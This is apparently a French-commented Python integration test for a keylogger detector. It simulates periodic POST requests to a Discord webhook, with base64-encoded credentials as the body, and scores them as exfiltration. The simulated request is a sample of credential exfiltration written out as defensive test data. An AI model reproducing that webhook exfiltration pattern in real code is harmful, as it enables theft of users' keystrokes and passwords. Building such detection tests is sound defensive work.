"""
Test d'intégration du module keylogger avec l'Observer
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from src.detection.keylogger_detector import KeyloggerDetector
from datetime import datetime, timedelta
import json

def test_full_scenario():
    """Scénario complet : détection d'un keylogger exfiltrant vers Discord"""
    
    print("🔍 SCÉNARIO: Keylogger exfiltrant vers Discord Webhook\n")
    
    detector = KeyloggerDetector()
    
    # Simulation de 5 requêtes POST périodiques vers Discord
    print("📊 Simulation de trafic suspect...")
    connections = []
    payloads = []
    
    for i in range(5):
        timestamp = datetime.now() + timedelta(seconds=i*60)
        connections.append({'timestamp': timestamp})
        
        # Payload encodé (simule frappes clavier)
        payload = f"POST https://discord.com/api/webhooks/123/token HTTP/1.1\nContent-Type: application/json\n\n{{'content': 'dXNlcm5hbWU6YWRtaW4gcGFzc3dvcmQ6MTIzNDU2'}}"
        payloads.append(payload)
    
    # Analyse 1: Pattern temporel
    print("\n1️⃣ ANALYSE DU PATTERN TEMPOREL")
    pattern = detector.analyze_traffic_pattern(connections)
    print(f"   Trafic périodique: {pattern['periodic']}")
    print(f"   Intervalle: {pattern['avg_interval']:.1f}s")
    print(f"   Risk: {pattern['risk_score']}/10")
    
    # Analyse 2: Domaine
    print("\n2️⃣ ANALYSE DU DOMAINE")
    url = "discord.com/api/webhooks/123/token"
    is_suspect = detector.check_domain(url)
    print(f"   URL: {url}")
    print(f"   Suspect: {'🚨 OUI' if is_suspect else '✅ NON'}")
    
    # Analyse 3: Payloads
    print("\n3️⃣ ANALYSE DES PAYLOADS")
    total_risk = 0
    for i, payload in enumerate(payloads):
        result = detector.analyze_payload(payload)
        total_risk += result['risk_score']
        print(f"   Payload {i+1}: Risk {result['risk_score']}/10 - Matches: {len(result['matches'])}")
    
    # Verdict final
    print("\n" + "="*50)
    print("🎯 VERDICT FINAL")
    print("="*50)
    
    final_score = min((pattern['risk_score'] + total_risk/len(payloads) + (8 if is_suspect else 0)) / 3, 10)
    
    print(f"Score de risque global: {final_score:.1f}/10")
    
    if final_score >= 7:
        verdict = "🚨 KEYLOGGER DÉTECTÉ - BLOCAGE RECOMMANDÉ"
    elif final_score >= 4:
        verdict = "⚠️ COMPORTEMENT SUSPECT - INVESTIGATION NÉCESSAIRE"
    else:
        verdict = "✅ TRAFIC NORMAL"
    
    print(f"Verdict: {verdict}")
    
    # Générer un rapport JSON
    report = {
        "timestamp": datetime.now().isoformat(),
        "scenario": "Discord Webhook Exfiltration",
        "risk_score": final_score,
        "verdict": verdict,
        "details": {
            "periodic_traffic": pattern['periodic'],
            "suspicious_domain": is_suspect,
            "avg_payload_risk": total_risk/len(payloads)
        }
    }
    
    print(f"\n📄 Rapport JSON:")
    print(json.dumps(report, indent=2))
    
    return report

if __name__ == "__main__":
    test_full_scenario()
